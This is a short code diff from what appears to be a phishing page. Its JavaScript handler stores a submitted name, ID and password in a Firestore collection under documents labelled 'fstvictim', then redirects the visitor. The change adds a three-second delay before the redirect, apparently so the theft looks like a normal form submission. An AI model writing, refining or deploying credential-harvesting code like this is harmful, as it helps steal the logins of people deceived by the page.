@@ -17,13 +17,14 @@ function sendthis(){
 	if (name !== "" && vid !== "" && pass !== "" )
 	{
 		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
-		window.location.href = "final.html";
+		setTimeout(function() { window.location.href = "final.html";},3000);
 	}
 	else
 	{
 		document.getElementById("t").innerHTML = "Please Complete The Form";
 		alert("Please Complete The Form");
 	}
+
 
 }
 
